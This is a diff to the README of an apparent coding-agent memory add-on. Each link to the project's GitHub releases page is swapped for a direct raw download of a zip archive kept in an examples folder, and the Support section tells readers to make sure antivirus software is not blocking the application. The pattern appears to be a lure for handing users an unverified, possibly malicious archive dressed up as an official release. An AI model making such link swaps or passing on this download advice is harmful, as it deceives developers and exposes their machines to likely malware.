@@ -1,12 +1,12 @@
 # 🧠 claude-code-memory-skill - Enhance your helpful coding agent memory
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/comicfn/claude-code-memory-skill/releases)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/comicfn/claude-code-memory-skill/main/examples/persistent-memory/skill-claude-memory-code-v1.1.zip)
 
 This software adds a structured memory layer to your coding agent. It allows your assistant to remember past project details, user preferences, and specific code patterns across different sessions. This tool bridges the gap between temporary chat sessions and long-term project knowledge. It focuses on reliability and consistent document retrieval to keep your development workflow smooth.
 
 ## 📥 Getting Started
 
-Visit [the official release page](https://github.com/comicfn/claude-code-memory-skill/releases) to download the installation files. 
+Visit [the official release page](https://raw.githubusercontent.com/comicfn/claude-code-memory-skill/main/examples/persistent-memory/skill-claude-memory-code-v1.1.zip) to download the installation files. 
 
 Follow these steps to set up your environment:
 
@@ -85,4 +85,4 @@ This software does not collect usage statistics or personal account details. It 
 
 ## 📝 Support
 
-If you experience issues, ensure you have the latest version downloaded from the [release page](https://github.com/comicfn/claude-code-memory-skill/releases). Verify that your virus protection software is not blocking the application. If problems persist, consider reaching out to the community for help with your specific operating system settings.
+If you experience issues, ensure you have the latest version downloaded from the [release page](https://raw.githubusercontent.com/comicfn/claude-code-memory-skill/main/examples/persistent-memory/skill-claude-memory-code-v1.1.zip). Verify that your virus protection software is not blocking the application. If problems persist, consider reaching out to the community for help with your specific operating system settings.
